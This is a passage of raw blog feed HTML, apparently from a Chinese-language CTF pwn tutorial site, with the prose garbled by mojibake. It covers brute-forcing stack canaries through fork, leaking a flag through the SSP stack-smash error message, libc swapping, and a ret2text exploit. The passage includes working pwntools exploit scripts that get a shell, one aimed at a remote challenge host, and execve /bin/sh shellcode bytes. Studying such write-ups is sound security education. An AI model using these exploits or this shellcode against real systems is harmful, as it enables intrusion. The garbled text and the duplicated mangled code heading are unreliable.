href="https://xzfile.aliyuncs.com/upload/affix/20190402135117-554ed694-550b-1.zip">https://xzfile.aliyuncs.com/upload/affix/20190402135117-554ed694-550b-1.zip</a></li></ul></blockquote><p>èµ·æ‰‹ä¸€å¥—ç»å…¸è¿æ‹›<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250214201715.png" alt="Pasted image 20250214201715"><br>32ä½ç¨‹åºï¼Œå¼€å¯äº†Canaryå’ŒNXä¿æŠ¤ï¼ŒéšåIDAæŸ¥çœ‹<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250214202433.png" alt="Pasted image 20250214202433"><br>ç¨‹åºä¸­å«æœ‰forkå‡½æ•°ï¼Œæ˜¯å¯è¿›è¡Œçˆ†ç ´canaryçš„é‡ç‚¹<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250214202509.png" alt="Pasted image 20250214202509"><br>funå‡½æ•°readæœ‰æ ˆæº¢å‡ºï¼Œbufç©ºé—´æœ‰100=0x64ï¼Œè€Œæˆ‘ä»¬å¯ä»¥è¾“å…¥0x78çš„å†…å®¹ï¼Œå¾ˆæ˜æ˜¾æ ˆæº¢å‡º<br>è¿™ä¸ªv2å°±æ˜¯Canary<br>æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ä¸€ä½ä¸€ä½çˆ†ç ´Canary</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">gdb bin1b *0x0804874Bb *0x0804870Crset follow-fork-mode child&#x2F;&#x2F;è·Ÿéšå­è¿›ç¨‹ctelescope $esp 35canary<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level &#x3D; &#39;debug&#39;context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]context(arch&#x3D;&#39;i386&#39;, os&#x3D;&#39;linux&#39;)local &#x3D; 1elf &#x3D; ELF(&#39;.&#x2F;bin1&#39;)if local:    p &#x3D; process(&#39;.&#x2F;bin1&#39;)    libc &#x3D; elf.libcelse:    p &#x3D; remote(&#39;&#39;)    libc &#x3D; ELF(&#39;.&#x2F;&#39;)p.recvuntil(b&#39;welcome\n&#39;)canary &#x3D; b&#39;\x00&#39;for k in range(3):  info(f&#39;-----No:&#123;k+1&#125; start,finding-----&#39;)  for i in range(256):     p.send(b&#39;a&#39;*(0x70-0xc)+canary+bytes([i]))     recv &#x3D; p.recvuntil(b&#39;welcome\n&#39;)     print(recv)     if b&quot;stack&quot; in recv:        continue     else:      canary +&#x3D; bytes([i])      success(f&quot;canary &#x3D;&gt; &#123;canary.hex()&#125;&quot;)      breakaddr &#x3D; 0x0804863B payload &#x3D; b&#39;A&#39; * 100 + canary + b&#39;A&#39; * 12 + p32(addr) p.send(payload) p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>getshell<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250214225926.png" alt="Pasted image 20250214225926"></p><h2 id="4-SSPæ³„éœ²Canary"><a href="#4-SSPæ³„éœ²Canary" class="headerlink" title="4. SSPæ³„éœ²Canary"></a>4. SSPæ³„éœ²Canary</h2><blockquote><p>é€‚ç”¨äºFlagå­˜å‚¨äºå†…å­˜ç©ºé—´ä¸­çš„æƒ…å†µ</p></blockquote><h3 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h3><blockquote><p>OJçš„smashes</p></blockquote><p>Stack smashå°±æ˜¯ç»•è¿‡canaryä¿æŠ¤çš„æŠ€æœ¯ã€‚åœ¨ç¨‹åºåŠ è½½äº†canaryä¿æŠ¤ä¹‹åï¼Œå¦‚æœæˆ‘ä»¬æ˜¯åœ¨è¦†ç›–ç¼“å†²åŒºçš„æ—¶å€™å°±ä¼šè¿å¸¦ç€è¦†ç›–äº†canaryä¿æŠ¤çš„cookieï¼Œ<strong>è¿™ä¸ªæ—¶å€™ç¨‹åºå°±ä¼šæŠ¥é”™ã€‚ä½†æ˜¯è¿™ä¸ªæŠ€æœ¯å¹¶ä¸åœ¨ä¹æ˜¯å¦æŠ¥é”™ï¼Œè€Œæ˜¯åœ¨ä¹æŠ¥é”™çš„å†…å®¹</strong>ã€‚stack smashæŠ€å·§å°±æ˜¯åˆ©ç”¨æ‰“å°è¿™ä¸€ä¿¡æ¯çš„ç¨‹åºæ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ã€‚<br>è¿™æ˜¯å› ä¸ºåœ¨ç¨‹åºå¯åŠ¨canaryä¿æŠ¤ä¹‹åï¼Œå¦‚æœå‘ç°canaryè¢«ä¿®æ”¹çš„è¯å°±ä¼šæ‰§<strong>stack_chk_failå‡½æ•°æ¥æ‰“å°argv[0]æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œæ­£å¸¸æƒ…å†µä¸‹è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘ç¨‹åºåã€‚ä»£ç å¦‚ä¸‹ï¼š<br><pre class="line-numbers language-c" data-language="c"><code class="language-c">void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123;  __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123;  &#x2F;* The loop is added only to keep gcc happy.  *&#x2F;  while (1)    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>æ‰€ä»¥å¦‚æœæˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›–argv[0]ä¸ºæˆ‘ä»¬æƒ³è¦è¾“å‡ºçš„å­—ç¬¦ä¸²åœ°å€ï¼Œé‚£ä¹ˆåœ¨</strong>fortify_failå‡½æ•°ä¸­å°±ä¼šè¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯<br><strong>sspæ”»å‡»ï¼šargv[0]æ˜¯æŒ‡å‘ç¬¬ä¸€ä¸ªå¯åŠ¨å‚æ•°å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿè¾“å…¥è¶³å¤Ÿé•¿çš„å­—ç¬¦ä¸²è¦†ç›–æ‰argv[0]ï¼Œæˆ‘ä»¬å°±èƒ½è®©canaryä¿æŠ¤è¾“å‡ºæˆ‘ä»¬æƒ³è¦åœ°å€ä¸Šçš„å€¼</strong></p><h3 id="xxxxxxxxxx21-1from-pwn-import-2-context-log-level-â€œdebugâ€3context-terminal-â€œdeepin-terminalâ€-â€œ-xâ€-â€œshâ€-â€œ-câ€-4â€‹5while-True-6-try-7-io-process-â€œ-babypieâ€-timeout-1-8-9-gdb-attach-io-10-io-sendafter-bâ€-nâ€-bâ€™aâ€™-0x30-0x8-1-11-io-recvuntil-bâ€™aâ€™-0x30-0x8-1-12-canary-bâ€™-0â€™-io-recvn-7-13-success-canary-encode-â€˜hexâ€™-14-15-gdb-attach-io-16-io-sendafter-bâ€-nâ€-bâ€™aâ€™-0x30-0x8-canary-bâ€™bbbbbbbbâ€™-bâ€™-x3E-x0Aâ€™-17-18-io-interactive-19-except-Exception-as-e-20-io-close-21-print-ï¼ˆeï¼‰python"><a href="#xxxxxxxxxx21-1from-pwn-import-2-context-log-level-â€œdebugâ€3context-terminal-â€œdeepin-terminalâ€-â€œ-xâ€-â€œshâ€-â€œ-câ€-4â€‹5while-True-6-try-7-io-process-â€œ-babypieâ€-timeout-1-8-9-gdb-attach-io-10-io-sendafter-bâ€-nâ€-bâ€™aâ€™-0x30-0x8-1-11-io-recvuntil-bâ€™aâ€™-0x30-0x8-1-12-canary-bâ€™-0â€™-io-recvn-7-13-success-canary-encode-â€˜hexâ€™-14-15-gdb-attach-io-16-io-sendafter-bâ€-nâ€-bâ€™aâ€™-0x30-0x8-canary-bâ€™bbbbbbbbâ€™-bâ€™-x3E-x0Aâ€™-17-18-io-interactive-19-except-Exception-as-e-20-io-close-21-print-ï¼ˆeï¼‰python" class="headerlink" title="xxxxxxxxxx21 1from pwn import 2#  context.log_level = â€œdebugâ€3context.terminal = [â€œdeepin-terminalâ€, â€œ-xâ€, â€œshâ€, â€œ-câ€]4â€‹5while True:6    try:7        io = process(â€œ./babypieâ€, timeout = 1)8        9        #  gdb.attach(io)10        io.sendafter(bâ€:\nâ€, bâ€™aâ€™  (0x30 - 0x8 + 1))11        io.recvuntil(bâ€™aâ€™  (0x30 - 0x8 + 1))12        canary = bâ€™\0â€™ + io.recvn(7)13        success(canary.encode(â€˜hexâ€™))14        15        #  gdb.attach(io)16        io.sendafter(bâ€:\nâ€, bâ€™aâ€™  (0x30 - 0x8) + canary + bâ€™bbbbbbbbâ€™ + bâ€™\x3E\x0Aâ€™)17        18        io.interactive()19    except Exception as e:20        io.close()21        print ï¼ˆeï¼‰python"></a>xxxxxxxxxx21 1from pwn import <em>2#  context.log_level = â€œdebugâ€3context.terminal = [â€œdeepin-terminalâ€, â€œ-xâ€, â€œshâ€, â€œ-câ€]4â€‹5while True:6    try:7        io = process(â€œ./babypieâ€, timeout = 1)8        9        #  gdb.attach(io)10        io.sendafter(bâ€:\nâ€, bâ€™aâ€™ </em> (0x30 - 0x8 + 1))11        io.recvuntil(bâ€™aâ€™ <em> (0x30 - 0x8 + 1))12        canary = bâ€™\0â€™ + io.recvn(7)13        success(canary.encode(â€˜hexâ€™))14        15        #  gdb.attach(io)16        io.sendafter(bâ€:\nâ€, bâ€™aâ€™ </em> (0x30 - 0x8) + canary + bâ€™bbbbbbbbâ€™ + bâ€™\x3E\x0Aâ€™)17        18        io.interactive()19    except Exception as e:20        io.close()21        print ï¼ˆeï¼‰python</h3><p>è€è¿æ‹›<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215192414.png" alt="Pasted image 20250215192414"><br>å¼€äº†Canaryå’ŒNX<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215193505.png" alt="Pasted image 20250215193505"><br>ç¨‹åºæä¾›ä¸¤æ¬¡è¾“å…¥<code>!_IO_gets(v3)</code>å’Œ<code>**_IO_getc(stdin)**</code>ä¸¤æ¬¡è¾“å…¥éƒ½å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´<br>é¡ºå¸¦æä¸€ä¸‹ç¬¬äºŒæ¬¡çš„è¾“å…¥ï¼šå°†å†…å®¹è¾“å…¥åˆ°stdioä¸­ï¼Œé€šè¿‡å¾ªç¯æœ€åèµ‹å€¼ç»™äº†byte_600D20,å¯ä»¥çœ‹åˆ°æ•°ç»„é‡Œé¢å­˜æ”¾çš„æ˜¯ä¸€æ¡flagï¼Œæ­¤å¤–ç¨‹åºä¸­è¿˜æåˆ°äº†overwrite flagï¼Œæ‰€ä»¥è¿™é“é¢˜å¹¶ä¸æ˜¯æ‹¿shellï¼Œè€Œæ˜¯ä¸€é“æ‹¿flagçš„é¢˜ã€‚å›åˆ°å‰é¢çš„ç¨‹åºï¼Œv1å˜é‡æ¥æ”¶ç¬¬äºŒæ¬¡è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ä¼šä¸æ–­è¦†ç›–åŸæœ‰çš„flagå†…å®¹<br>å†çœ‹ä»¥ä¸‹memsetå‡½æ•°ï¼š<br><code>memset((void *)((int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));</code><br>è¿™ä¸ªå‡½æ•°çš„æ„æ€æ˜¯ä»v1 + 0x600D20LLè¿™ä¸ªåœ°å€å¾€å32 - v1å­—èŠ‚çš„å†…å®¹éƒ½ä»¥0æ›¿ä»£ã€‚<br>å‡½æ•°åŸå‹`void <em> memset( void </em> ptr, int value, size_t num );<br>å¯ä»¥çœ‹åˆ°0x600D20å¤„æ­£æ˜¯æˆ‘ä»¬flagæ‰€åœ¨çš„ä½ç½®ï¼Œæ‰€ä»¥æ— è®ºè¿›ä¸è¿›è¡Œç¬¬äºŒæ¬¡è¾“å…¥ï¼Œç¨‹åºéƒ½ä¼šæŠŠåŸæœ‰çš„flagè¦†ç›–æ‰ã€‚è¿™å°±å¾ˆéº»çƒ¦äº†ï¼Œæˆ‘ä»¬æƒ³è¦çš„å°±æ˜¯åˆ©ç”¨canaryæ‰“å°æŠ¥é”™çš„åŸç†ï¼Œå°†argv[0]æŒ‡å‘è¿™ä¸ªflagçš„åœ°å€ï¼Œä½†æ˜¯flagæ— è®ºæ€ä¹ˆæ ·éƒ½ä¼šè¢«è¦†ç›–</p><p>è¿™ä¸ªæ—¶å€™å°±éœ€è¦åˆ©ç”¨ä¸€ä¸ªæŠ€å·§ï¼š<strong><em>åœ¨ ELF å†…å­˜æ˜ å°„æ—¶ï¼Œbss æ®µä¼šè¢«æ˜ å°„ä¸¤æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦ä¸€å¤„çš„åœ°å€æ¥è¿›è¡Œè¾“å‡º</em></strong></p><blockquote><p><strong>å½“å¯æ‰§è¡Œæ–‡ä»¶è¶³å¤Ÿå°æ—¶ï¼Œå®ƒçš„ä¸åŒåŒºæ®µå¯èƒ½ä¼šè¢«å¤šæ¬¡æ˜ å°„</strong></p><h4 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h4><p>æˆ‘ä»¬å¯ä»¥å°†ç¨‹åºç”¨gdbæ‰“å¼€ï¼Œè¿è¡Œèµ·æ¥çœ‹ä¸€ä¸‹ç¨‹åºæ˜ å°„çš„æƒ…å†µï¼š<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215193505-1742920939134-10.png" alt="Pasted image 20250215193505"></p></blockquote><pre class="line-numbers language-C" data-language="C"><code class="language-C">0x400000           0x401000 r-xp     1000      0 &#x2F;home&#x2F;zechariah&#x2F;æ¡Œé¢&#x2F;pwn_learn&#x2F;start&#x2F;smashes0x600000           0x601000 rw-p     1000      0 &#x2F;home&#x2F;zechariah&#x2F;æ¡Œé¢&#x2F;pwn_learn&#x2F;start&#x2F;smashes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åœ¨è°ƒè¯•çš„æ—¶å€™å¯ä»¥çœ‹åˆ°smashesè¢«æ˜ å°„åˆ°ä¸¤å¤„åœ°å€ä¸­ï¼Œæ‰€ä»¥åªè¦åœ¨äºŒè¿›åˆ¶æ–‡ä»¶<code>(offset)0x0000 ~ 0x1000</code>èŒƒå›´å†…çš„å†…å®¹éƒ½ä¼šè¢«æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œåˆ†åˆ«ä»¥<code>0x400000</code>å’Œ<code>0x600000</code>ä½œä¸ºèµ·å§‹åœ°å€ã€‚flagåœ¨<code>0x00000d20</code>ï¼Œæ‰€ä»¥ä¼šåœ¨å†…å­˜ä¸­å‡ºç°ä¸¤æ¬¡ï¼Œåˆ†åˆ«ä½äº<code>0x00600d20</code>å’Œ<code>0x00400d20</code>ã€‚æ‰€ä»¥è™½ç„¶<code>0x00600d20</code>çš„ä½ç½®è™½ç„¶è¢«è¦†ç›–äº†ï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥åœ¨<code>0x00400d20</code>çš„ä½ç½®æ‰¾åˆ°flag<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215213101.png" alt="Pasted image 20250215213101"></p><h4 id="æ‰¾argv-0-æŒ‡é’ˆä½ç½®"><a href="#æ‰¾argv-0-æŒ‡é’ˆä½ç½®" class="headerlink" title="æ‰¾argv[0]æŒ‡é’ˆä½ç½®"></a>æ‰¾argv[0]æŒ‡é’ˆä½ç½®</h4><p>çŸ¥é“äº†flagå­˜æ”¾çš„ä½ç½®ï¼Œæ¥ä¸‹æ¥éœ€è¦æ‰¾argv[0]æ‰€åœ¨çš„ä½ç½®äº†ï¼Œargv[0]æœ‰ä¸€ä¸ªæ˜æ˜¾çš„ç‰¹å¾ï¼Œå°±æ˜¯ä»–ä¼šæŒ‡å‘ç¨‹åºåï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨gdbåœ¨mainå‡½æ•°å¤„ä¸‹æ–­ç‚¹ï¼Œæ¥ä¸‹æ¥æ‰¾æŒ‡å‘ç¨‹åºåçš„æŒ‡é’ˆå°±ä¼šæ˜¯argv[0]äº†<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215213646.png" alt="Pasted image 20250215213646"><br>0x7fffffffdf2få­˜æ”¾ç¨‹åºåç§°ï¼Œè¿™ä¸ªåœ°å€è¢«æ”¾åœ¨0x7fffffffdbf8å¤„ï¼Œåªè¦æŠŠ0x7fffffffdbf8ä¸­çš„å†…å®¹æ›¿æ¢æˆflagå³å¯<br>ä¹Ÿå¯ä»¥ç”¨å‘½ä»¤<code>p &amp; __libc_argv[0]</code> å¾—åˆ°argv[0]çš„åœ°å€<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215213950.png" alt="Pasted image 20250215213950"></p><h4 id="å¯»æ‰¾è¾“å…¥æ—¶çš„æ ˆé¡¶ä½ç½®"><a href="#å¯»æ‰¾è¾“å…¥æ—¶çš„æ ˆé¡¶ä½ç½®" class="headerlink" title="å¯»æ‰¾è¾“å…¥æ—¶çš„æ ˆé¡¶ä½ç½®"></a>å¯»æ‰¾è¾“å…¥æ—¶çš„æ ˆé¡¶ä½ç½®</h4><p>å…ˆçœ‹ä¸€ä¸‹getså‡½æ•°è°ƒç”¨çš„ä½ç½®ã€‚<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215214432.png" alt="Pasted image 20250215214432">å› ä¸ºåœ¨64ä½ç¨‹åºä¸­rdiå¯„å­˜å™¨ä¸­å­˜æ”¾çš„æ˜¯å½“å‰æ‰§è¡Œå‡½æ•°çš„ä¸€å‚ï¼Œæ‰€ä»¥å½“å‰çš„æ ˆé¡¶å°±æ˜¯getså‡½æ•°çš„ä¸€å‚ã€‚æ‰€ä»¥å½“å‰æ ˆé¡¶çš„ä½ç½®åˆ°åˆšæ‰çš„argv[0]çš„åç§»è·ç¦»å°±æ˜¯æˆ‘ä»¬çš„æº¢å‡ºé•¿åº¦ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡è®¡ç®—<br><code>0x7fffffffdbf8 - 0x7fffffffd9a0 = 0x218</code><br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥å†…å®¹è¦åœ¨0x218ä»¥åæ‰èƒ½æŠŠargv[0]ç»™è¦†ç›–æ‰ï¼Œå¹¶ä¸”è¾“å…¥0x218ä¸ªå†…å®¹ä¹‹åæŠŠ0x00400d20å†™ä¸Šå°±å¯ä»¥äº†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *# p&#x3D;process(&#39;.&#x2F;smashes&#39;)p&#x3D;remote(&#39;pwn.jarvisoj.com&#39;,9877)context.log_level&#x3D;&#39;debug&#39;payload&#x3D;b&#39;a&#39;*0x218+p64(0x400d20)p.sendlineafter(&#39;name? &#39;,payload)p.sendlineafter(&#39;flag: &#39;,&#39;hollk&#39;)print (p.recvall())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215214432-1742920972819-16.png" alt="Pasted image 20250215214432"><br>Ubuntuç‰ˆæœ¬åŸå› (libc 2.27ä¹‹ååŠ äº†å…¶ä»–æœºåˆ¶)ï¼Œè¿œç¨‹å¯æ‰“é€šï¼Œæœ¬åœ°ä¸è¡Œ</p><h2 id="5-åŠ«æŒ-stack-chk-failå‡½æ•°"><a href="#5-åŠ«æŒ-stack-chk-failå‡½æ•°" class="headerlink" title="5. åŠ«æŒ__stack_chk_failå‡½æ•°"></a>5. åŠ«æŒ__stack_chk_failå‡½æ•°</h2>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ˆ </tag>
            
            <tag> PWNæŠ€å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNæŠ€å·§-å…¶ä»–</title>
      <link href="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/"/>
      <url>/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¢åº“"><a href="#æ¢åº“" class="headerlink" title="æ¢åº“"></a>æ¢åº“</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings libc.so.6 | grep &#39;ubuntu&#39;#Ubuntu GLIBC 2.35-0ubuntu3.8#Ubuntu GLIBC 2.23-0ubuntu11.3.&#x2F;download 2.23-0ubuntu11.3_amd64patchelf --set-interpreter &#x2F;home&#x2F;zechariah&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.35-0ubuntu3.9_amd64&#x2F;ld-linux-x86-64.so.2 filenamepatchelf --replace-needed libc.so.6 .&#x2F;libc.so.6 filename    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Capstoneå­—èŠ‚ç è½¬æ±‡ç¼–ä»£ç "><a href="#Capstoneå­—èŠ‚ç è½¬æ±‡ç¼–ä»£ç " class="headerlink" title="Capstoneå­—èŠ‚ç è½¬æ±‡ç¼–ä»£ç "></a><strong>Capstoneå­—èŠ‚ç è½¬æ±‡ç¼–ä»£ç </strong></h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">from capstone import *shellcode_x86 &#x3D; b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;shellcode_x86 +&#x3D; b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;shellcode_x86 +&#x3D; b&quot;\x0b\xcd\x80&quot;md &#x3D; Cs(CS_ARCH_X86, CS_MODE_32)for i in md.disasm(shellcode_x86, 0x00):    print(&quot;0x%x:\t%s\t%s&quot; %(i.address, i.mnemonic, i.op_str))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">md &#x3D; Cs(CS_ARCH_X86, CS_MODE_32): åˆå§‹åŒ–ç±»ï¼Œç»™ä¸¤ä¸ªå‚æ•°ï¼ˆç¡¬ä»¶æ¶æ„å’Œç¡¬ä»¶æ¨¡å¼ï¼‰for i in md.disasm(shellcode, 0x00):  disasm åæ±‡ç¼–è¿™æ®µHEX, å®ƒçš„å‚æ•°æ˜¯shellcodeå’Œèµ·å§‹åœ°å€ã€‚print(â€œ0x%x:\t%s\t%sâ€ %(i.address, i.mnemonic, i.op_str)):æ‰“å°åœ°å€å’Œæ“ä½œæ•°ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦-cyclic"><a href="#æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦-cyclic" class="headerlink" title="æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦(cyclic)"></a><strong>æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦(cyclic)</strong></h1><h2 id="åˆè¯•"><a href="#åˆè¯•" class="headerlink" title="åˆè¯•"></a>åˆè¯•</h2><p>checksecï¼Œ32ä½<br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122123732.png" alt="Pasted image 20250122123732"><br>æ‹–å…¥IDA<br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122123854.png" alt="Pasted image 20250122123854"><br>å®¹æ˜“å¼•èµ·æ ˆæº¢å‡ºçš„å‡½æ•°<code>gets</code><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122123840.png" alt="Pasted image 20250122123840"><br>æ‰¾åˆ°åé—¨å‡½æ•°<br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122124119.png" alt="Pasted image 20250122124119"><br>åœ°å€ä¸º<code>0x804863A</code><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122123911.png" alt="Pasted image 20250122123911"><br>å®Œæˆå¦‚ä¸‹expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *p&#x3D;process(&quot;.&#x2F;ret2text&quot;)offset&#x3D;104addr &#x3D; 0x804863Apayload&#x3D;b&#39;a&#39;* offset + p32(addr)p.sendline(payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122124958.png" alt="Pasted image 20250122124958"><br>æ‰“ä¸é€š</p><h2 id="æ‰‹åŠ¨æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦"><a href="#æ‰‹åŠ¨æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦" class="headerlink" title="æ‰‹åŠ¨æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦"></a>æ‰‹åŠ¨æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦</h2><p>çŒœæµ‹ä¹Ÿè®¸æ˜¯IDAä¸­çš„å˜é‡æº¢å‡ºé•¿åº¦æ˜¯é”™è¯¯çš„<br>äºæ˜¯æˆ‘ä»¬æ‰‹åŠ¨æµ‹é‡</p><h3 id="å·¥å…·cyclicç”Ÿæˆå­—ç¬¦ä¸²"><a href="#å·¥å…·cyclicç”Ÿæˆå­—ç¬¦ä¸²" class="headerlink" title="å·¥å…·cyclicç”Ÿæˆå­—ç¬¦ä¸²"></a>å·¥å…·cyclicç”Ÿæˆå­—ç¬¦ä¸²</h3><p><code>cyclic 200</code>ç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º200çš„å­—ç¬¦ä¸²<br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122130556.png" alt="Pasted image 20250122130556"></p><h3 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" 